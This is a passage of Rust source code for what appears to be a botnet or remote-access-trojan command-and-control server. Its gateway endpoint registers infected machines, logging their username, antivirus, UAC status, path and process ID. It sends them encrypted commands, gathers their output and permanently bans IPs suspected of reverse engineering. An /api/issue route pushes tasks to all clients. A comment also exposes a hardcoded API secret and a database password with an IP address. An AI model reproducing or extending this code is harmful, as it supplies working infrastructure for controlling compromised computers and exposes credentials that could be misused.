extern crate openssl;
extern crate colored; 
use actix_web::{
    post,
    App, HttpResponse, 
    HttpServer, Responder, 
    HttpRequest,
    http::StatusCode
};

use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
use std::process::exit;
use std::{
    time::SystemTime, 
    time::UNIX_EPOCH, 
    fs, str, fs::File,
    io::Write
};

use openssl::symm::{Cipher, Crypter, Mode};
use openssl::error::ErrorStack;
use openssl::base64::{decode_block, encode_block};

use colored::Colorize;
use random_string::generate;
use crate::serde_json::json;
use serde_json;
use sha256;
use randomizer::{Charset, Randomizer};
use rand;
use mysql_async::*;
use mysql_async::prelude::*;
use std::path::Path;
use std::process::Command;

use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use rsa::pkcs1::EncodeRsaPublicKey;
use std::net::IpAddr;
use maxminddb::geoip2;
use lazy_static::lazy_static;
use std::sync::{Arc, RwLock};

lazy_static! {
    static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref HONOR_CLIENT_BLOCKS: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
    static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
    static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new( RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
}

/*
const API_SECRET: &str = "Pt~a[=-#Z8C+Bv:q5WQ*pD";
const DB_URL: &str = "mysql://root:r39H)jfd!01JD@213.248.43.36:3306/mydb";

const CONNECTION_INTERVAL: u64 = 60;
const HONOR_CLIENT_BLOCKS: bool = false;
*/

#[derive(Debug)]
enum GenericError {
    Mysql(Error),
    NoRows,
    _WrongData,
    _ProgramErrored,
    _Expired
}

// ------------------------ DB functions ------------------------

async fn obtain_connection() -> Conn {
    return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
} 

async fn is_client(connection: &mut Conn, client_id: &String) -> bool {

    let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT client_id FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match client_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_client: {}", 
                e
            ));
            false
        },
    }
}


async fn is_load(connection: &mut Conn, load_id: &String) -> bool { 

    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT load_id FROM loads WHERE load_id = :load_id",
        params! {
            "load_id" => load_id,
        }
    ).await;

    match load_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_load: {}", e));
            false
        },
    }
}


async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
    let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
        params! {
            "last_seen" => get_timestamp(),
            "client_id" => client_id
        }
    ).await;
}

async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {

    let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"SELECT last_seen FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    match last_seen_query {
        Ok(None) =>  {
            return 0
        },
        
        Ok(_) =>  {
            last_seen_query.unwrap().unwrap()
        },

        Err(e) => {
            fprint("error", &format!("At get_last_seen: {}", e));
            return 0
        },
    }
}

async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {

    let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    // TODO: Check for encryption key validity. If it's invalid, return error.

    match encryption_key_query {
        Ok(None) =>  { Err(GenericError::NoRows) },
        Ok(_) =>  { 
            let raw_key = encryption_key_query.unwrap().unwrap();
            let split_key: Vec<&str> = raw_key.split(".").collect();
            let current_time = get_timestamp();
            // if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {

            if 
                current_time >= split_key[1].parse::<u64>().unwrap() && 
                (get_last_seen(connection, &client_id).await + *CONNECTION_INTERVAL.read().unwrap()) <= current_time
            {
                return Err(GenericError::_Expired)
            } else {
                return Ok(String::from(split_key[0]))
            }
        },

        Err(e) => {
            fprint("error", &format!(
                "At get_encryption_key: {}", 
                e
            ));
            Err(GenericError::Mysql(e))
        }
    }
}



// TODO: Fix this fucking horrible code
async fn block_client(connection: &mut Conn, client_id: &String, ip: &String, duration: u64) -> bool {
   let banned_until = get_timestamp() + duration;

   #[derive(Debug, PartialEq, Eq)]
   struct Block {
       client_id: String,
       ip: String,
       banned_until: u64,
   }


   // TODO: Replace the struct with =>

    let result = connection.exec_batch(
    r"INSERT INTO blocks (client_id, ip, banned_until) VALUES (:client_id, :ip, :banned_until)",
    vec![
        Block {
            client_id: client_id.clone(),
            ip: ip.clone(),
            banned_until: banned_until,
        }
    ].iter().map(|p: &Block| params! {
            "client_id" => &p.client_id,
            "ip" => &p.ip,
            "banned_until" => &p.banned_until

        })
    ).await;

    match result {
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "(block_client): {}", 
                e
            ));
            false
        }
    }

   
}


async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &String) -> bool {
    let honor_client_blocks = *HONOR_CLIENT_BLOCKS.read().unwrap();

    if !honor_client_blocks {return false;}

    let blocked_client_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"SELECT banned_until FROM blocks WHERE client_id = :client_id OR ip = :ip",
        params! {
            "client_id" => &client_id,
            "ip" => &ip,
        }
    ).await;

    match blocked_client_query {
        Ok(None) => false,
        Ok(_) =>  {
            if blocked_client_query.unwrap().unwrap() < get_timestamp() {

                let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
                    r"DELETE FROM blocks WHERE client_id = :client_id OR ip = :ip",
                    params! {
                        "client_id" => &client_id,
                        "ip" => &ip,
                    }
                ).await;

                false
            } else {
                true
            }
        },
        Err(e) => {
            fprint("error", &format!(
                "At is_client_blocked: {}", 
                e
            ));
            false
        },
    }
}

async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {


    let mut connection:Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
    let mut connection2: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
    
    let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
    drop(connection2);

    connection.query_drop("START TRANSACTION").await.unwrap();

    for row in selected_clients.unwrap() {       

        let command_id = generate(8, "abcdef123456789");
        let client_id = value_to_str(&row, 0);

        let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
            r"
            INSERT INTO commands (
                command_id, client_id, load_id,
                cmd_type, cmd_args, 
                time_issued
            ) VALUES (
                :command_id, :client_id, :load_id,
                :cmd_type, :cmd_args,
                :time_issued
            )",
            params! {
                "command_id" => &command_id,
                "client_id" => &client_id,
                "load_id" => &load_id,
                "cmd_type" => &cmd_type,
                "cmd_args" => &cmd_args,
                "time_issued" => get_timestamp(),
            }
        ).await;
    
        match command_insert_sql {
            Ok(_) => (),
            Err(e) => {
                fprint("error", &format!("Tasking all clients failed: {}", e));
                panic!()
            }
        }
    }
    connection.query_drop("COMMIT").await.unwrap();
}

async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
    let command_id = generate(8, "abcdef123456789");
    let task_client_sql_success = connection.exec_drop(  
        r"
        INSERT INTO commands (
            command_id, client_id, cmd_type,
            cmd_args, time_issued
        ) VALUES (
            :command_id, :client_id, :cmd_type, :cmd_args, :time_issued
        )",
        params! {
            "command_id" => &command_id,
            "client_id" => &client_id,
            "cmd_type" => &cmd_type,
            "cmd_args" => &cmd_args,
            "time_issued" => get_timestamp(),
        }
    ).await;

    match task_client_sql_success {
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "(task_client): {}", 
                e
            ));
            false
        }
    }
}

async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> std::result::Result<(String, String, String), GenericError> {
    
    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type FROM commands WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match command_fetch_sql {

        Ok(None) => {
            Err(GenericError::NoRows)
        },
        Ok(_) => {
            let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                unwrapped.1,
                unwrapped.2,
            ))
        },
        Err(e) => {

            fprint("error", &format!(
                "At get_current_client_command: {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }
}

async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::result::Result<(String, String, String, u64), GenericError> {

    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type, time_issued FROM commands WHERE command_id = :command_id",
        params! {
            "command_id" => command_id,
        }
    ).await;

    match command_fetch_sql {
       
        Ok(_) => {
            let unwrapped: (String, String, String, u64) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                unwrapped.1,
                unwrapped.2,
                unwrapped.3,
            ))
        },
        Err(e) => {
            fprint("error", &format!(
                "At get_current_client_command: {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }

}

async fn is_command(connection: &mut Conn, command_id: &String, client_id: &String) -> bool {

    let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
        params! {
            "client_id" => client_id,
            "command_id" => command_id,
        }
    ).await;
    
    match command_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_command: {}", 
                e
            ));
            false
        },
    }
}

async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id: &String) -> bool {
    let loads_query_sql = connection.exec_drop(
        r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
        params! {
            "client_id" => &client_id,
            "load_id" => &load_id,
        }
    ).await;

    match loads_query_sql {
        Ok(_) => true,
        Err(ref e) => {
            fprint("error", &format!(
                "(is_uncompleted_load): {}", 
                e
            ));
            false
        }
    }
}



// ------------------------ General Functions ------------------------


fn get_timestamp() -> u64 {
    let since_the_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards lmao");
    return since_the_epoch.as_secs()
}

fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
    let cipher = Cipher::aes_256_cbc();

    let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
    encrypter.pad(true);

    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];
    let count = encrypter.update(plaintext.as_bytes(), &mut ciphertext)?;
    let final_count = encrypter.finalize(&mut ciphertext[count..])?;

    ciphertext.truncate(count + final_count);
    Ok(encode_block(&ciphertext))
}


fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
    let ciphertext = decode_block(ciphertext).unwrap();
    let cipher = Cipher::aes_256_cbc();
    let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
    decrypter.pad(true);

    let mut plaintext = vec![0; ciphertext.len() + cipher.block_size()];
    let count = decrypter.update(&ciphertext, &mut plaintext)?;
    let final_count = decrypter.finalize(&mut plaintext[count..])?;

    plaintext.truncate(count + final_count);
    Ok(plaintext)
}

fn fprint(stype: &str, sformatted: &str) -> () {
    
    let color = match stype {
        "info" => stype.to_uppercase().cyan(),
        "error" => stype.to_uppercase().red(),
        "failure" => stype.to_uppercase().red(),
        "success" => stype.to_uppercase().green(),
        "task" => stype.to_uppercase().yellow(),
        _ => stype.to_uppercase().white(),
    };

    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
}


fn value_to_str(row: &mysql_async::Row, index: usize) -> String {
    if let Some(value) = row.as_ref(index) {
        match value {
            Value::NULL => String::from(""),
            Value::Bytes(v) => String::from_utf8_lossy(v.as_slice()).into_owned(),
            Value::Int(v) => format!("{v}"),
            Value::UInt(v) => format!("{v}"),
            Value::Float(v) => format!("{v}"),
            Value::Double(v) => format!("{v}"),
            Value::Date(_year, _month, _day, _hour, _minutes, _seconds, _micro) => todo!(),
            Value::Time(_negative, _days, _hours, _minutes, _seconds, _micro) => todo!(),
        }
    } else {
        String::from("")
    }
}

fn value_to_u64(row: &mysql_async::Row, index: usize) -> u64 {return value_to_str(row, index).parse::<u64>().unwrap();}
fn value_to_bool(row: &mysql_async::Row, index: usize) -> bool { match value_to_u64(row, index) {1 => true, 0 => false, _ => panic!("Not a bool")} }

fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}

fn all_keys_valid(json: &serde_json::Value, keys: Vec<&str>, types: Vec<&str>) -> bool {
    let mut counter: usize = 0;
    for key in keys {
        if let Some(_) = json.get(key) {
            // Check if key is one of the valid types:
            if types[counter] == "String" {
                match json[key].as_str() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "u64" {
                match json[key].as_u64() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "bool" {
                match json[key].as_bool() {
                    Some(_) => (),
                    None => return false,
                };
            }
        } else {
            return false;
        }
        counter += 1;
    }
    return true
}

async fn ip_to_country(ip: &str) -> String {
    let ip_db = &*IP_DATABASE.read().unwrap();
    let reader = maxminddb::Reader::from_source(ip_db).unwrap();
    let ip: IpAddr = ip.parse().unwrap();
    let country: std::prelude::v1::Result<geoip2::Country, maxminddb::MaxMindDBError> = reader.lookup(ip);
    match country {
        Ok(_) => String::from(country.unwrap().country.unwrap().iso_code.unwrap()),
        Err(_) => String::from("NL")
    }
}


// ------------------------ HTTP Responses ------------------------

fn resp_unauthorised() -> HttpResponse {
    return HttpResponse::build(StatusCode::UNAUTHORIZED).body("You do not have the required authorization to complete this request.");
}

fn resp_badrequest() -> HttpResponse {
    return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
}

fn resp_servererror() -> HttpResponse {
    return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
}

fn resp_ok(message: String) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(message);
}

fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).unwrap());
}

// ------------------------ Init Functions ------------------------


async fn initialize_tables(connection_pool: Pool) {
    let mut connection: Conn = connection_pool.get_conn().await.expect("Unable to connect to database.");

    connection.query_drop(r"
    
        SET GLOBAL query_cache_size = 268435455;

    ").await.expect("Failed to init db");

    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS clients (
            client_id TEXT,
            version INTEGER,
            uac BOOL,
            ip TEXT,
            country TEXT,
            username TEXT,
            guid TEXT,
            cpu TEXT,
            gpu TEXT,
            ram INTEGER,
            antivirus TEXT,
            path TEXT,
            pid INTEGER,
            last_seen INTEGER,
            first_seen INTEGER,
            encryption_key TEXT
        )  ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
        ").await.expect("clients table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT,
            load_id TEXT,
            client_id TEXT,
            cmd_type TEXT,
            cmd_args TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands (client_id);
        CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands (command_id);

        ").await.expect("commands table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS outputs (
            output_id TEXT,
            command_id TEXT,
            client_id TEXT,
            cmd_args TEXT,
            cmd_type TEXT,
            output TEXT,
            time_issued INT,
            time_received INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_outputs_client_id ON outputs (client_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_command_id ON outputs (command_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_output_id ON outputs (output_id);
        ").await.expect("outputs table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS loads (
            load_id TEXT,
            required_amount INT,
            recursive_load BOOL,
            cmd_args TEXT,
            cmd_type TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_loads_load_id ON loads (load_id);
        ").await.expect("loads table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS blocks (
            client_id TEXT,
            ip TEXT,
            banned_until INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_blocks_client_id ON blocks (client_id);
        CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
        ").await.expect("blocks table creation failed");
    
    drop(connection);
}

// ------------------------ Main Program ------------------------

#[post("/gateway")]
async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {

    if req_body.len() < 16 { return resp_badrequest(); } // No possible way this is a legit request if this is triggered
    let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    let honor_client_blocks = *HONOR_CLIENT_BLOCKS.read().unwrap();
    let ip: String = req.peer_addr().unwrap().ip().to_string();

    
    let client_id = String::from(&req_body[0..16]);
    let encryption_key = get_encryption_key(&mut connection, &client_id).await;
    
    match encryption_key {
        Ok(_) => (),
        Err(GenericError::_Expired) => {
            fprint("error", &format!("A client from ip {} sent a request with an expired encryption key. Blocked for 20m.", &ip.yellow()));
            block_client(&mut connection, &String::from("N/A"), &ip, 1200).await;
            drop(connection); return resp_unauthorised();
        },
        Err(_) => {
            
            let parts: Vec<&str> = req_body.split("|").collect::<Vec<&str>>();
   
            let client_bytes = (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &decode_block(parts[1]).unwrap());
            match client_bytes {
                Ok(_) => (),
                Err(_) => {
                    fprint("error", "Client sent a registration request encrypted with the wrong RSA key.");
                    drop(connection); return resp_badrequest();
                }
            }; let client_bytes = client_bytes.unwrap();

            let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypt_string_withkey(parts[0], &client_bytes).unwrap()).unwrap()).expect("erm");

            let server_bytes = Randomizer::new(32, Some(Charset::AnyByte)).bytes().unwrap();

            // Key formatted like this: (encryption key).(time (past this, key is invalid))
            let encryption_key = format!(
                "{}.{}", 
                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32], 
                get_timestamp() + connection_interval
            );

            if !all_keys_valid(
                &json, 
                vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
                vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
            ) {
                fprint("error", "Client sent a malformed registration request. They've been blocked for 20 minutes.");
                drop(connection); return resp_badrequest();
            }

            // Client ID is constructed from GUID, Version, and Username. If any of these values change a new client ID is fabricated.
            let client_id = String::from(&sha256::digest(format!("{}{}{}{}", 
                key_to_string(&json, "guid"), 
                key_to_u64(&json, "version"), 
                key_to_string(&json, "username"),
                &*API_SECRET.read().unwrap()
            ))[..16]);
            // This prevents clients that have blocked IPs from sending registration requests to the server.
            if is_client_blocked(&mut connection, &client_id, &ip).await {
                fprint("failure", &format!("({}) {} tried to send a request whilst blocked.", ip.red(), client_id.red()));
                drop(connection); return resp_unauthorised();
            }


            if is_client(&mut connection, &client_id).await {
                // Maybe remove this fraction.
                if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {

                    // If client took longer than 45 seconds to send a request.
                    let update_clients_sql: std::result::Result<Vec<String>, Error> = connection.exec(
                        r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key WHERE client_id = :client_id",
                        params! {
                            "uac" => key_to_bool(&json, "uac"),
                            "ip" => &ip,
                            "country" => ip_to_country(&ip).await,
                            "cpu" => key_to_string(&json, "cpu"),
                            "gpu" => key_to_string(&json, "gpu"),
                            "ram" => key_to_u64(&json, "ram"),
                            "antivirus" => key_to_string(&json, "antivirus"),
                            "path" => key_to_string(&json, "path"),
                            "pid" => key_to_u64(&json, "pid"),
                            "last_seen" => get_timestamp(),
                            "client_id" => &client_id,
                            "encryption_key" => &encryption_key
                        }
                    ).await;

                    match update_clients_sql {
                        Ok(_) => (),
                        Err(e) => fprint("error", &format!("Unable to update client data: {}", e))
                    };
                    
                    fprint("success", &format!("({}) {} has reconnected after being offline.", &ip.yellow(), client_id.yellow()));
                    update_last_seen(&mut connection, &client_id).await;        

                } else {
                    // If client took longer than 45s

                }
            
            } else {

                let insert_client_sql: std::result::Result<Vec<String>, Error> = connection.exec(
                    r"INSERT INTO clients (
                        client_id, version, uac, ip,
                        country, 
                        username, guid, cpu, 
                        gpu, ram, antivirus, 
                        path, pid, last_seen, 
                        first_seen, encryption_key
                    ) 
                    
                    VALUES (
                        :client_id, :version, :uac, :ip,
                        :country,
                        :username, :guid, :cpu,
                        :gpu, :ram, :antivirus,
                        :path, :pid, :last_seen,
                        :first_seen, :encryption_key
                    )",
                    params! {
                        "client_id" => &client_id,
                        "version" => key_to_u64(&json, "version"),
                        "uac" => key_to_bool(&json, "uac"),
                        "ip" => &ip,
                        "country" => ip_to_country(&ip).await,
                        "username" => key_to_string(&json, "username"),
                        "guid" => key_to_string(&json, "guid"),
                        "cpu" => key_to_string(&json, "cpu"),
                        "gpu" => key_to_string(&json, "gpu"),
                        "ram" => key_to_u64(&json, "ram"),
                        "antivirus" => key_to_string(&json, "antivirus"),
                        "path" => key_to_string(&json, "path"),
                        "pid" => key_to_u64(&json, "pid"),
                        "last_seen" => get_timestamp(),
                        "first_seen" => get_timestamp(),
                        "encryption_key" => &encryption_key
                    }
                ).await;

                match insert_client_sql {
                    Ok(_) => (),
                    Err(e) => {
                        fprint("error", &format!("Unable to insert new client data into db: {}",e));
                        drop(connection); return resp_servererror();
                    }
                };
        
                fprint("success", &format!("{}", 
                    format!("({}) {} registered with username {}", 
                    &ip.yellow(),  
                    client_id.yellow(), 
                    key_to_string(&json, "username").yellow()
                )));
            }

            // TODO: Change to iter and not first
            let load_ids = connection.query_map(r"SELECT load_id, cmd_args, cmd_type, recursive_load FROM loads", |row: Row| {
                (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2), value_to_str(&row, 3))
            }).await;

            match load_ids {
                Ok(_) => (),
                Err(_) => {
                    fprint("error", "Unable to fetch load ids.");
                }
            };
            
            for result in load_ids.unwrap() {
                if is_uncompleted_load(&mut connection, &client_id, &result.0).await || result.3.parse::<bool>().unwrap() {
                    task_client(&mut connection, &client_id, &result.1, &result.2).await;
                }   
            }
            drop(connection); return resp_ok_encrypted(&json!({
                "client_id": &client_id,
                "server_bytes": encode_block(&server_bytes)
            }).to_string(), &client_bytes);
        },
    };

    let encryption_key = encryption_key.unwrap();
    let decrypted_body = decrypt_string_withkey(&req_body[16..], &encryption_key.as_bytes());

    match decrypted_body {
        Ok(_) => (),
        Err(_) => {
            fprint("error", &format!("({}) {} unable to decrypt message. This isn't normal, blocking for 20m.", &client_id.yellow(), &ip.yellow()));
            block_client(&mut connection, &client_id, &ip, 1200).await;
            drop(connection); return resp_unauthorised();
        }
    }

    let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypted_body.unwrap()).unwrap()).unwrap();

    if !key_exists(&json, "action") {
        fprint("error", "Client didn't provide an action. Blocked client for 20m.");
        block_client(&mut connection, &client_id, &ip, 1200).await;
        drop(connection); return resp_unauthorised();
        
    } 

    else if key_to_string(&json, "action") == "block" {
        block_client(&mut connection, &String::from("N/A"), &ip, 3155695200).await;
        fprint("failure", &format!("{} was blocked forever due to a reverse engineering attempt.", ip.red()));
        drop(connection); return resp_unauthorised();

    } else if key_to_string(&json, "action") == "heartbeat" { 

        // If the client is banned, we will go to the else. If it isn't, we will update the last seen time.
        if !is_client_blocked(&mut connection, &client_id, &ip).await {

            if !(get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp()) && honor_client_blocks {
                block_client(&mut connection, &client_id, &ip, 300).await;
                fprint("failure", &format!("({}) {} blocked for sending an irregular number of regisration requests for 5 minutes.", &ip.yellow(), client_id.yellow()));
                drop(connection); return resp_unauthorised();
                
            }
          
            update_last_seen(&mut connection, &client_id).await;        

            let command_info: std::result::Result<(String, String, String), GenericError> = get_current_client_command(&mut connection, &client_id).await;
           
            match command_info {
                Ok(_) => (),
                Err(GenericError::NoRows) => {
                    drop(connection); return resp_ok_encrypted("Ok", encryption_key.as_bytes());
                },
                Err(_) => {
                    fprint("error", "At gateway (command_info)");
                    drop(connection); return resp_servererror();
                },
            }
            
            let (command_id, cmd_args, cmd_type) = command_info.unwrap();

            drop(connection); return resp_ok_encrypted(&json!({
                "command_id": command_id,
                "cmd_args": cmd_args,
                "cmd_type": cmd_type
            }).to_string(),  encryption_key.as_bytes());

        } else {
            fprint("failure", &format!("({}) {} tried sending a heartbeat with an invalid client id. No action taken.", ip.red(), client_id.red()));
            drop(connection); return resp_unauthorised();
        }

    } else if key_to_string(&json, "action") == "submit_output" {

        if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
            fprint("error", "Client didn't provide all keys when submitting output. Blocked for 20m.");
            block_client(&mut connection, &client_id, &ip, 1200).await;

            drop(connection); return resp_badrequest();
        }

        let command_id = key_to_string(&json, "command_id");
        let output_id = generate(8, "abcdef123456789");
        let output = key_to_string(&json, "output");
        
        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
        
        if is_command(&mut connection, &command_id, &client_id).await && !is_client_blocked(&mut connection, &client_id, &ip).await {

            let (command_id, cmd_args, cmd_type, time_issued) = get_command_info(&mut connection, &command_id).await.unwrap();
            let output_insert: std::result::Result<Vec<String>, Error> = connection.exec(
            
                r"INSERT INTO outputs (
                output_id, command_id, 
                client_id, cmd_args, 
                cmd_type, output, 
                time_issued, time_received
                ) VALUES 
                
                ( :output_id, :command_id, 
                :client_id, :cmd_args, 
                :cmd_type, :output, 
                :time_issued, :time_received)",

                params! {
                    "output_id" => &output_id,
                    "command_id" => &command_id,
                    "client_id" => &client_id,
                    "cmd_args" => &cmd_args,
                    "cmd_type" => &cmd_type,
                    "output" => &output,
                    "time_issued" => &time_issued,
                    "time_received" => get_timestamp(),

                }
            ).await;

            connection.exec_drop(
                r"DELETE FROM commands WHERE command_id = :command_id",
                params! {
                    "command_id" => &command_id,
                }
            ).await.unwrap();
        
            match output_insert {
                Ok(_) => (),
                Err(e) => fprint("error", &format!("Unable to delete command: {}",e))
            }
            fprint("info", &format!("({}) {} completed command {} with type {}. Output: {}", &ip, &client_id, &command_id, &cmd_type, &output));
            update_last_seen(&mut connection, &client_id).await;        

            drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes());
        } else {
            fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
            drop(connection); return resp_badrequest();
        }

        // TODO: Add else if here, move this shit down and add a check if none of the actions are correct.
    } else {
        fprint("error", "Client didn't provide a valid action. Blocked for 20m.");
        block_client(&mut connection, &client_id, &ip, 1200).await;
        drop(connection); return resp_badrequest();
    }
}



// TODO: Change to issue_load
#[post("/api/issue")]
async fn api_issue(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
        let load_id = generate(8, "abcdef123456789");

        let load_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
            r"INSERT INTO loads (
                load_id, required_amount, cmd_args, 
                recursive_load, cmd_type, 
                time_issued
            ) VALUES (
                :load_id, :required_amount, :cmd_args, 
                :recursive_load, :cmd_type,
                :time_issued
            )",
            params! {
                "load_id" => &load_id,
                "cmd_args" => key_to_string(&json, "cmd_args"),
                "required_amount" => key_to_u64(&json, "required_amount"),
                "recursive_load" => key_to_bool(&json, "recursive"),
                "cmd_type" => key_to_string(&json, "cmd_type"),
                "time_issued" => get_timestamp(),
            }
        ).await;
    
        match load_insert_sql {
            Ok(_) => (),
            Err(e) => fprint("error", &format!("Unable to insert data into load: {}",e)), 
        }

        let recursive_text;
        if key_to_bool(&json, "recursive") {
            recursive_text = "Recursive";
        } else {
            recursive_text = "Non-recursive";
        }

